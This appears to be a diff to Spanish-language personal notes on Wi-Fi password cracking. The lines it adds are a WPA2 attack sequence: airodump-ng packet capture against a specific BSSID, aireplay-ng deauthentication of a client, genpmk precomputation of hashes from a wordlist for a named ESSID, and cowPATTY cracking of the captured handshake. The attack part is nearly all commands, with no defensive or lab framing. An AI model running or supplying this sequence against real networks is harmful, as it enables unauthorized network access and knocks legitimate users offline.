@@ -117,3 +117,28 @@ aireplay-ng -0 1 -a $bssid -c $cliente $wlan0
 
 //Crackeo de contraseña WEP SKA
 aircrack-ng -0 $captura
+
+
+
+##WPA2 con coWPATTY
+
+sudo airodump-ng wlan0
+
+//captura de paquetes
+sudo airodump-ng -c 4 --bssid 04:FE:8D:76:5B:88 -w wpa2 wlan0   
+
+//Deautenticación
+sudo aireplay-ng -0 10 -a $bssid -c $cliente wlan0
+
+genpmk -f ../Documents/darkc0de.lst -d hashesgenerados -s "KAROL CAJAS"   //essid
+genpmk 1.3 - WPA-PSK precomputation attack. <jwright@hasborg.com>
+File hashesgenerados does not exist, creating.
+
+cowpatty -r file.cap -d hashesgenerados -2 -s "KAROL CAJAS"
+
+
+
+
+
+
+
